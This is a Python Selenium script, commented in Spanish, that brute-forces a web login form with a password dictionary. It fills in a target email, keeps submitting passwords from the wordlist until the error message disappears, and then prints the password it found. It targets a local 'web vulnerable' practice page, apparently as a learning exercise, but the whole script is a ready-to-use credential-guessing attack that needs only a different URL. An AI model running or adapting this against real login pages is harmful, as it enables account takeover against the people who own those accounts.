from selenium.webdriver.edge.service import Service
from webdriver_manager.microsoft import EdgeChromiumDriverManager
from selenium import webdriver
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.by import By

# Asegúrate de que también has importado EdgeOptions correctamente
from selenium.webdriver.edge.options import Options as EdgeOptions
import time
edge_options = EdgeOptions()
# Configura tus opciones de Edge aquí

driver = webdriver.Edge(service=Service(EdgeChromiumDriverManager().install()), options=edge_options)


# Abre la página web con el formulario
url = 'http://127.0.0.1:5501/web%20vulnerable/index.html'
driver.get(url)

# Encuentra los elementos del formulario y rellénalos
email = WebDriverWait(driver, 10).until(
    EC.visibility_of_element_located((By.NAME, 'identifier'))
)
email.send_keys(input("Escribe el correo para hackear: (en mi ejemplo es: carla@gmail.com, y su contraseña: Charizard)"))
password = WebDriverWait(driver, 10).until(
	EC.visibility_of_element_located((By.NAME, 'password'))
)
# Encuentra y haz clic en el botón de enviar
boton_siguiente = driver.find_element(By.ID, "submit")
boton_siguiente.click()
passwordsPath = input("Introduzca la ruta de su diccionario:\n")
with open(passwordsPath, 'r', errors='ignore') as archivo:
    passwordsList = [linea.strip() for linea in archivo]
pos = 0

messageDiv = WebDriverWait(driver, 10).until(
    EC.visibility_of_element_located((By.ID, 'message'))
)
while True:
	if( messageDiv.text == "Contraseña o email incorrectos" ):
		password.clear()
		password.send_keys(passwordsList[pos])
  
		boton_siguiente = driver.find_element(By.ID, "submit")
		boton_siguiente.click()
		pos+=1
		# time.sleep(0.1)		
	else:
		print(f"Contraseña encontrada!\n	La contraseña es: {passwordsList[pos-1]}")
		break

time.sleep(1)

